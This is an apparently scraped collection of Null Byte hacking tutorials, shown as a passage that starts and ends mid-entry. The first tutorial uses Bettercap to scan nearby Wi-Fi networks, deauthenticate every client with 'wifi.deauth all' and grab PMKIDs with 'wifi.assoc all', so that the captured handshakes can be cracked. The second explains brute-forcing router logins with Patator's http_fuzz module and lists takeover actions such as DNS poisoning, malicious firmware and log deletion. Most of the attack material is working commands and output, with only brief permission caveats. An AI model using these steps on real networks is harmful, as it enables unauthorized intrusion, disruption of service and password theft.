(default=rssi asc)\nwifi.skip-broken : If true, dot11 packets with an invalid checksum will be skipped. (default=true)\nwifi.source.file : If set, the wifi module will read from this pcap file instead of the hardware interface. (default=)\nwifi.txpower : Set WiFi transmission power to this value before activating the interface. (default=30)\nHere, we can see lots of options! For our purposes, we'll be selecting the Wi-Fi recon module. To start it, type wifi.recon on into Bettercap. You'll begin to get a flood of messages as soon as networks start to be detected. If this gets overwhelming, you can type events.stream off to mute the alerts.\nwlan1  » wifi.recon on\n[23:01:35] [sys.log] [inf] wifi WiFi region set to 'BO'\n[23:01:35] [sys.log] [inf] wifi interface wlan1 txpower set to 30\n[23:01:35] [sys.log] [inf] wifi started (min rssi: -200 dBm)\nwlan1  » [23:01:35] [sys.log] [inf] wifi channel hopper started\nwlan1  » [23:01:35] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:35] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:35] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:36] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:36] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:36] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:36] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:37] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:37] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:37] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:37] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:38] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:38] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:38] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:39] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:39] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:39] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:41] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:41] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:41] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:42] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:42] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:42] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:01:42] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:42] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:43] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:52] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:52] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:52] [wifi.ap.new] wifi access point ████████████████████████████████████████████████████████████\nwlan1  » [23:01:53] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nStep 5: Identify Targets\nTo see the networks that have been detected, type wifi.show to display a list of networks.\nwlan1  »  wifi.show\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| RSSI ▴  |       BSSID       |             SSID              |    Encryption    | WPS | Ch | Clients |  Sent  | Recvd  |   Seen   |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| -55 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (TKIP, PSK) |     | 6  |         |        |        | 23:01:35 |\n| -57 dBm | ██:██:██:██:██:██ | █████████████                 | OPEN             |     | 6  | 1       | 400 B  | 66 B   | 23:01:36 |\n| -63 dBm | ██:██:██:██:██:██ | ██████                        | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:01:36 |\n| -64 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (TKIP, PSK) | 2.0 | 5  | 1       | 7.1 kB | 128 B  | 23:01:37 |\n| -66 dBm | ██:██:██:██:██:██ | ████████████████              | WPA (TKIP, PSK)  |     | 1  |         |        |        | 23:01:39 |\n| -71 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 1  |         |        |        | 23:01:35 |\n| -72 dBm | ██:██:██:██:██:██ | ████████████████████████████  | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:01:35 |\n| -81 dBm | ██:██:██:██:██:██ | ████████████████              | OPEN             |     | 11 |         |        |        | 23:01:43 |\n| -82 dBm | ██:██:██:██:██:██ | ████████████████████████      | WPA2 (CCMP, PSK) |     | 7  |         |        |        | 23:01:43 |\n| -82 dBm | ██:██:██:██:██:██ |                               | WPA2 (CCMP, PSK) | 2.0 | 6  |         | 3.9 kB |        | 23:01:39 |\n| -86 dBm | ██:██:██:██:██:██ | ████████████████              | OPEN             |     | 1  | 1       |        | 177 B  | 23:01:35 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, MGT) |     | 1  |         |        |        | 23:01:38 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:01:38 |\n| -86 dBm | ██:██:██:██:██:██ | ██████████████                | WPA2 (CCMP, PSK) |     | 6  | 1       | 670 B  | 384 B  | 23:01:39 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:01:39 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:01:37 |\n| -87 dBm | ██:██:██:██:██:██ | █████████████████████████████ | WPA2 (CCMP, PSK) | 2.0 | 8  |         |        |        | 23:01:36 |\n| -87 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  |         | 759 B  |        | 23:01:44 |\n| -87 dBm | ██:██:██:██:██:██ | ████████████████████          | OPEN             |     | 6  | 1       | 228 B  | 1.2 kB | 23:01:43 |\n| -88 dBm | ██:██:██:██:██:██ | ███████████████████████████   | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:01:44 |\n| -88 dBm | ██:██:██:██:██:██ | ██████████████████            | OPEN             |     | 8  |         |        |        | 23:01:41 |\n| -88 dBm | ██:██:██:██:██:██ | ███████████████████████████   | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:01:41 |\n| -90 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:01:41 |\n| -91 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (TKIP, PSK) |     | 11 |         |        |        | 23:01:41 |\n| -92 dBm | ██:██:██:██:██:██ | ██                            | WPA2 (CCMP, PSK) | 2.0 | 11 |         |        |        | 23:01:35 |\n| -92 dBm | ██:██:██:██:██:██ | <hidden>                      | OPEN             |     | 6  |         |        |        | 23:01:37 |\n| -92 dBm | ██:██:██:██:██:██ | ████████                      | WPA2 (TKIP, PSK) |     | 11 |         |        |        | 23:01:37 |\n| -94 dBm | ██:██:██:██:██:██ | █████████████████████████     | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:01:37 |\n| -94 dBm | ██:██:██:██:██:██ | ██████████████████████████    | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:01:42 |\n| -95 dBm | ██:██:██:██:██:██ | █████████████████             | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:01:41 |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\nwlan1mon (ch. 12) / ↑ 0 B / ↓ 1.5 MB / 6556 pkts\nWow, we can see tons of information about the nearby wireless environment around us, such as which networks are strongest and what kinds of encryption they use.\nYou'll notice that all of the networks will be in green (you can't see it in this article, but on yours, you will see green). When we see a network is red (again, not in the box above but you will see it on your end), it means we have a handshake for it and can attempt to brute-force it. Let's start with a tried-and-true method first, and use the deauth module to try to get handshakes.\nStep 6: Attack with a Deauth Attack\nTo start the deauth module, you'll type wifi.deauth and then the MAC address of the network you want to attack. If you want to attack every network you've found, you can just type all or *, but be aware this can be illegal if you're interfering with someone's Wi-Fi that did not permit you to test this tool on it.\nwlan1  » wifi.deauth all\nwlan1  » [23:02:53] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:02:54] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:02:55] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:02:55] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:02:56] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:02:57] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:02:57] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:02:58] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:02:59] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:00] [wifi.client.new] new station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:01] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:01] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:02] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:02] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:03] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:04] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:04] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:05] [wifi.client.handshake] capturing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:05] [wifi.client.handshake] capturing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:05] [wifi.client.handshake] capturing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [wifi.client.handshake] capturing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [wifi.client.handshake] capturing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [sys.log] [inf] wifi deauthing ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nwlan1  » [23:03:06] [wifi.client.probe] station ████████████████████████████████████████████████████████████\nAfter allowing the tool to run for a minute or so, we can see the results by typing wifi.show and seeing if any results have come in red. In our example, we can see that we've managed to grab handshakes for three of the nearby Wi-Fi networks we've detected.\nwlan1  » wifi.show\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| RSSI ▴  |       BSSID       |             SSID              |    Encryption    | WPS | Ch | Clients |  Sent  | Recvd  |   Seen   |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| -55 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  | 5       | 12 kB  |        | 23:03:06 |\n| -57 dBm | ██:██:██:██:██:██ | █████████████                 | WPA2 (CCMP, PSK) |     | 6  | 1       | 6.5 kB | 66 B   | 23:03:04 |\n| -63 dBm | ██:██:██:██:██:██ | ██████                        | WPA2 (CCMP, PSK) |     | 11 | 2       | 1.2 kB |        | 23:03:04 |\n| -64 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (CCMP, PSK) | 2.0 | 5  | 2       | 7.1 kB | 128 B  | 23:03:02 |\n| -71 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 1  | 2       | 353 B  |        | 23:03:05 |\n| -72 dBm | ██:██:██:██:██:██ | ████████████████████████████  | WPA2 (CCMP, PSK) |     | 6  | 1       | 4.9 kB |        | 23:03:06 |\n| -81 dBm | ██:██:██:██:██:██ | ████████████████              | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:03:06 |\n| -82 dBm | ██:██:██:██:██:██ | ████████████████████████      | WPA2 (CCMP, PSK) |     | 7  |         |        |        | 23:03:07 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 1  |         |        |        | 23:03:01 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:03:02 |\n| -86 dBm | ██:██:██:██:██:██ | ██████████████                | WPA2 (CCMP, PSK) |     | 6  |         | 670 B  | 384 B  | 23:03:02 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:03:01 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:03:01 |\n| -87 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  |         | 759 B  |        | 23:03:02 |\n| -87 dBm | ██:██:██:██:██:██ | ████████████████████          | WPA2 (CCMP, PSK) |     | 6  |         | 228 B  | 1.2 kB | 23:03:04 |\n| -88 dBm | ██:██:██:██:██:██ | ███████████████████████████   | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:03:04 |\n| -88 dBm | ██:██:██:██:██:██ | ██████████████████            | WPA2 (CCMP, PSK) |     | 8  |         |        |        | 23:03:04 |\n| -90 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:03:06 |\n| -91 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (TKIP, PSK) |     | 11 |         | 1.7 kB |        | 23:03:04 |\n| -92 dBm | ██:██:██:██:██:██ | ██                            | WPA2 (CCMP, PSK) | 2.0 | 11 |         |        |        | 23:03:08 |\n| -92 dBm | ██:██:██:██:██:██ | ████████                      | WPA2 (TKIP, PSK) |     | 11 |         |        |        | 23:03:08 |\n| -94 dBm | ██:██:██:██:██:██ | ██████████████████████████    | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:03:09 |\n| -95 dBm | ██:██:██:██:██:██ | █████████████████             | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:03:09 |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\nwlan1mon (ch. 12) / ↑ 73 kB / ↓ 8.9 MB / 28100 pkts / 2 handshakes\nThis is a good result, but many of these networks are not attended, as can be seen by the client count section. Notice how this method didn't work against any network that didn't have clients attached? To attack these unattended networks, we'll need to run the second module. To save any handshakes captured, use set wifi.handshake followed by the directory you want to save the file in.\nwlan1  » set wifi.handshakes '/desiredfolderlocation'\nStep 7: Attack with a PMKID Attack\nTo begin our attack against unattended networks, we'll type wifi.assoc and then the MAC address that we want to attack. If we're going to attack all networks we've detected, typing all or * instead will do so. If you enabled events.stream off but want to see the results of this module roll in, you can reenable the event stream by typing events.stream on and watching for results that look like the following.\nwlan1  » wifi.assoc all\nwlan1  » [23:04:58] [wifi.client.handshake] captured ██:██:██:██:██:██ -> ATT286GPs5 (██:██:██:██:██:██) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\nwlan1  » [23:04:58] [wifi.client.handshake] captured ██:██:██:██:██:██ -> ATT286GPs5 (██:██:██:██:██:██) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\nwlan1  » [23:04:58] [wifi.client.handshake] captured ██:██:██:██:██:██ -> ATT286GPs5 (██:██:██:██:██:██) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\nwlan1  » [23:04:58] [wifi.client.handshake] captured ██:██:██:██:██:██ -> ATT286GPs5 (██:██:██:██:██:██) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\nwlan1  » [23:04:58] [wifi.client.handshake] captured ██:██:██:██:██:██ -> ATT286GPs5 (██:██:██:██:██:██) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\nNow that we've tried both tools, let's take a look at our results with wifi.show. We should, if we're lucky, see more networks in red. While there are no colors below, five of them were indeed red.\nwlan1  » wifi.show\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| RSSI ▴  |       BSSID       |             SSID              |    Encryption    | WPS | Ch | Clients |  Sent  | Recvd  |   Seen   |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\n| -55 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  | 5       | 12 kB  |        | 23:04:36 |\n| -57 dBm | ██:██:██:██:██:██ | █████████████                 | WPA2 (CCMP, PSK) |     | 6  | 1       | 6.5 kB | 66 B   | 23:04:34 |\n| -63 dBm | ██:██:██:██:██:██ | ██████                        | WPA2 (CCMP, PSK) |     | 11 | 2       | 1.2 kB |        | 23:04:34 |\n| -64 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (CCMP, PSK) | 2.0 | 5  | 2       | 7.1 kB | 128 B  | 23:04:32 |\n| -90 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:04:36 |\n| -71 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 1  | 2       | 353 B  |        | 23:04:35 |\n| -72 dBm | ██:██:██:██:██:██ | ████████████████████████████  | WPA2 (CCMP, PSK) |     | 6  | 1       | 4.9 kB |        | 23:04:36 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:04:31 |\n| -81 dBm | ██:██:██:██:██:██ | ████████████████              | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:04:36 |\n| -82 dBm | ██:██:██:██:██:██ | ████████████████████████      | WPA2 (CCMP, PSK) |     | 7  |         |        |        | 23:04:37 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 1  |         |        |        | 23:04:31 |\n| -86 dBm | ██:██:██:██:██:██ | ███████████████████           | WPA2 (CCMP, PSK) |     | 6  |         |        |        | 23:04:32 |\n| -86 dBm | ██:██:██:██:██:██ | ██████████████                | WPA2 (CCMP, PSK) |     | 6  |         | 670 B  | 384 B  | 23:04:32 |\n| -86 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, MGT) |     | 6  |         |        |        | 23:04:31 |\n| -87 dBm | ██:██:██:██:██:██ | <hidden>                      | WPA2 (CCMP, PSK) |     | 6  |         | 759 B  |        | 23:04:32 |\n| -87 dBm | ██:██:██:██:██:██ | ████████████████████          | WPA2 (CCMP, PSK) |     | 6  |         | 228 B  | 1.2 kB | 23:04:34 |\n| -88 dBm | ██:██:██:██:██:██ | ███████████████████████████   | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:04:34 |\n| -88 dBm | ██:██:██:██:██:██ | ██████████████████            | WPA2 (CCMP, PSK) |     | 8  |         |        |        | 23:04:34 |\n| -91 dBm | ██:██:██:██:██:██ | ██████████                    | WPA2 (TKIP, PSK) |     | 11 |         | 1.7 kB |        | 23:04:34 |\n| -92 dBm | ██:██:██:██:██:██ | ██                            | WPA2 (CCMP, PSK) | 2.0 | 11 |         |        |        | 23:04:38 |\n| -92 dBm | ██:██:██:██:██:██ | ████████                      | WPA2 (TKIP, PSK) |     | 11 |         |        |        | 23:04:38 |\n| -94 dBm | ██:██:██:██:██:██ | ██████████████████████████    | WPA2 (CCMP, PSK) | 2.0 | 6  |         |        |        | 23:04:39 |\n| -95 dBm | ██:██:██:██:██:██ | █████████████████             | WPA2 (CCMP, PSK) |     | 11 |         |        |        | 23:04:39 |\n+---------+-------------------+-------------------------------+------------------+-----+----+---------+--------+--------+----------+\nwlan1mon (ch. 12) / ↑ 45 kB / ↓ 8.9 MB / 38377 pkts / 3 handshakes\nBy running both modules, we were able to grab the information we need for five out of the ten closest Wi-Fi networks. That's pretty impressive. If we open the file Bettercap generated from these captures, we can see the information Bettercap has saved for us to crack in another program.\nThere we go! With Bettercap, we can capture the signals we need from Wi-Fi networks to brute-force weak passwords. You can follow our guide on handshake cracking with Hashcat to try brute-forcing the passwords.\n* Don't Miss: Cracking WPA2 Passwords with the PMKID Hashcat Attack\nBettercap Is the Swiss Army Knife of Wi-Fi Hacking\nBettercap is an essential part of any hacker's toolkit, especially for the ability to run smoothly on low-cost devices like a Raspberry Pi. With Bettercap's ability to quickly discover low-hanging fruit like weak network passwords, you can use it to gain further access to devices on a network through ARP spoofing and poisoning in other Bettercap modules.\nMake sure only to use the active modules of Bettercap on networks you have permission to use, but the recon modules are fine to use virtually anywhere. With enough patience, Bettercap will simply record handshakes when users connect to the network naturally, without needing to attack the network at all.\nI hope you enjoyed this guide to using Betterecap to hack Wi-Fi networks! If you have any questions about this tutorial, there's the comments section below, and feel free to follow me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Break into Router Gateways with Patator",
        "link": "https://null-byte.wonderhowto.com/how-to/break-into-router-gateways-with-patator-0194600/",
        "content": "Router gateways are responsible for protecting every aspect of a network's configuration. With unfettered access to these privileged configurations, an attacker on a compromised Wi-Fi network can perform a wide variety of advanced attacks.\nBrute-Forcing Router Logins with Patator\nAfter hacking a Wi-Fi router with tools like Aircrack, Wifiphisher, and Wifite2, there are several avenues an attacker may explore to further compromise the network. Assuming the gateway isn't using defaultcredentials, the attacker will try to exploit a vulnerability in the router or perform a brute-force attack.\nWith access to the router's gateway and complete control over the configurations, a hacker in this position of power can perform a variety of attacks. They could do any of the following, and then some.\n* perform DNS poisoning attacks\n* modify or manipulate forwarding ports\n* reset the gateway password\n* inject JavaScript into a browser on the network\n* reset the Wi-Fi name and password\n* install a malicious firmware\n* modify or delete login and system logs\n* modify or disable the firewall\nPatator, like Hydra and Medusa, is a command-line brute-forcing tool. The developers have tried to make it more reliable and flexible than its predecessors. My favorite feature of Patator is the raw_request module that allows penetration testers to brute-force HTTP logins much like Burp's Intruder module.\nA General Outline for an Attack\nTo demonstrate, I'm going to show how to use Patator against two popular consumer routers found on Amazon. Not all router gateways handle authentication the same. I'll show a kind of general procedure to follow when performing such attacks.\n1. Capture a login request: A single login attempt is captured in Burp to analyze the request.\n2. Identify the parameters: It's important to identify where the dynamic parameters (i.e., username and password) are stored in the request as some login forms handle authentication differently.\n3. Modify and save the request: After the parameters have been identified, insert a placeholder into the request to help Patator iterate through the desired wordlist.\n4. Generate a targeted wordlist: A targeted wordlist containing 10,000 passwords is usually more effective than a wordlist of 10 million random passwords. Some authentication methods involve hashing or encoding the credentials in the client's browser before making the request. The wordlist will need to reflect this as needed.\n5. Identity and filter failed requests: With modern routers, very rarely will a successful login attempt makes itself known. Understanding and filtering HTTP status codes play a big part in identifying the difference between a failed and successful login attempt.\nNow, a word of caution: Patator isn't very beginner-friendly, so there's a bit of a learning curve with the syntax that can take some getting used to. Before proceeding, you should have a general understanding of HTTP requests, HTTP status codes, and some experience with Burp's Intruder module.\nInstall Patator in Kali Linux\nUse the following apt-get command to install Patator in Kali.\n~# apt-get update && apt-get install patator\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following NEW packages will be installed:\nca-certificates-java default-jre default-jre-headless fonts-dejavu-extra freerdp2-x11 ike-scan java-common ldap-utils libatk-wrapper-java libatk-wrapper-java-jni libfreerdp-client2-2\nlibfreerdp2-2 libgif7 libwinpr2-2 openjdk-11-jre openjdk-11-jre-headless patator python3-ajpy python3-bcrypt python3-dnspython python3-ipy python3-mysqldb python3-nacl python3-openssl\npython3-paramiko python3-psycopg2 unzip\n0 upgraded, 27 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 43.9 MB of archives.\nAfter this operation, 192 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\nWhen that's done, use the --help option to verify Patator was successfully installed and view the available modules.\n~# patator --help\nPatator v0.7 (https://github.com/lanjelot/patator)\nUsage: patator module --help\nAvailable modules:\n+ ftp_login     : Brute-force FTP\n+ ssh_login     : Brute-force SSH\n+ telnet_login  : Brute-force Telnet\n+ smtp_login    : Brute-force SMTP\n+ smtp_vrfy     : Enumerate valid users using SMTP VRFY\n+ smtp_rcpt     : Enumerate valid users using SMTP RCPT TO\n+ finger_lookup : Enumerate valid users using Finger\n+ http_fuzz     : Brute-force HTTP\n+ ajp_fuzz      : Brute-force AJP\n+ pop_login     : Brute-force POP3\n+ pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)\n+ imap_login    : Brute-force IMAP4\n+ ldap_login    : Brute-force LDAP\n+ smb_login     : Brute-force SMB\n+ smb_lookupsid : Brute-force SMB SID-lookup\n+ rlogin_login  : Brute-force rlogin\n+ vmauthd_login : Brute-force VMware Authentication Daemon\n+ mssql_login   : Brute-force MSSQL\n+ oracle_login  : Brute-force Oracle\n+ mysql_login   : Brute-force MySQL\n+ mysql_query   : Brute-force MySQL queries\n+ rdp_login     : Brute-force RDP (NLA)\n+ pgsql_login   : Brute-force PostgreSQL\n+ vnc_login     : Brute-force VNC\n+ dns_forward   : Forward DNS lookup\n+ dns_reverse   : Reverse DNS lookup\n+ snmp_login    : Brute-force SNMP v1/2/3\n+ ike_enum      : Enumerate IKE transforms\n+ unzip_pass    : Brute-force the password of encrypted ZIP files\n+ keystore_pass : Brute-force the password of Java keystore files\n+ sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases\n+ umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes\n+ tcp_fuzz      : Fuzz TCP services\n+ dummy_test    : Testing module\nAs stated, we'll focus on the http_fuzz module, designed to brute-force HTTP logins as well as perform various types of web-based injection attacks (e.g., fuzzing). View the available http_fuzz options using the following command.\n~# patator http_fuzz --help\nPatator v0.7 (https://github.com/lanjelot/patator)\nUsage: http_fuzz <module-options ...> [global-options ...]\nhttp_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500\nhttp_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401\nhttp_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'\nModule options:\nurl           : target url (scheme://host[:port]/path?query)\nbody          : body data\nheader        : use custom headers\nmethod        : method to use [GET|POST|HEAD|...]\nraw_request   : load request from file\nscheme        : scheme [http|https]\nauto_urlencode: automatically perform URL-encoding [1|0]\nuser_pass     : username and password for HTTP authentication (user:pass)\nauth_type     : type of HTTP authentication [basic | digest | ntlm]\nfollow        : follow any Location redirect [0|1]\nmax_follow    : redirection limit [5]\naccept_cookie : save received cookies to issue them in future requests [0|1]\nproxy         : proxy to use (host:port)\nproxy_type    : proxy type [http|socks4|socks4a|socks5]\nresolve       : hostname to IP address resolution to use (hostname:IP)\nssl_cert      : client SSL certificate file (cert+key in PEM format)\ntimeout_tcp   : seconds to wait for a TCP handshake [10]\ntimeout       : seconds to wait for a HTTP response [20]\nbefore_urls   : comma-separated URLs to query before the main request\nbefore_header : use a custom header in the before_urls request\nbefore_egrep  : extract data from the before_urls response to place in the main request\nafter_urls    : comma-separated URLs to query after the main request\nmax_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]\npersistent    : use persistent connections [1|0]\nGlobal options:\n--version             show program's version number and exit\n-h, --help            show this help message and exit\n-x arg              actions and conditions, see Syntax below\n--start=N           start from offset N in the wordlist product\n--stop=N            stop at offset N\n--resume=r1[,rN]*   resume previous run\n-e arg              encode everything between two tags, see Syntax below\n-C str              delimiter string in combo files (default is ':')\n-X str              delimiter string in conditions (default is ',')\n--allow-ignore-failures\nfailures cannot be ignored with -x (this is by design\nto avoid false negatives) this option overrides this\nOptimization:\n--rate-limit=N      wait N seconds between each test (default is 0)\n--timeout=N         wait N seconds for a response before retrying payload\n(default is 0)\n--max-retries=N     skip payload after N retries (default is 4) (-1 for\n-t N, --threads=N   number of threads (default is 10)\n-l DIR              save output and response data into DIR\n-L SFX              automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX\n(DIR defaults to '/tmp/patator')\n-d, --debug         enable debug messages\n-x actions:conditions\nactions    := action[,action]*\naction     := \"ignore\" | \"retry\" | \"free\" | \"quit\" | \"reset\"\nconditions := condition=value[,condition=value]*\ncondition  := \"code\" | \"size\" | \"time\" | \"mesg\" | \"fgrep\" | \"egrep\" | \"clen\"\nignore      : do not report\nretry       : try payload again\nfree        : dismiss future similar payloads\nquit        : terminate execution now\nreset       : close current connection in order to reconnect next time\ncode        : match status code\nsize        : match size (N or N-M or N- or -N)\ntime        : match time (N or N-M or N- or -N)\nmesg        : match message\nfgrep       : search for string in mesg\negrep       : search for regex in mesg\nclen        : match Content-Length header (N or N-M or N- or -N)\nFor example, to ignore all redirects to the home page:\n... -x ignore:code=302,fgrep='Location: /home.html'\n-e tag:encoding\ntag        := any unique string (eg. T@G or _@@_ or ...)\nencoding   := \"hex\" | \"unhex\" | \"b64\" | \"md5\" | \"sha1\" | \"url\"\nhex         : encode in hexadecimal\nunhex  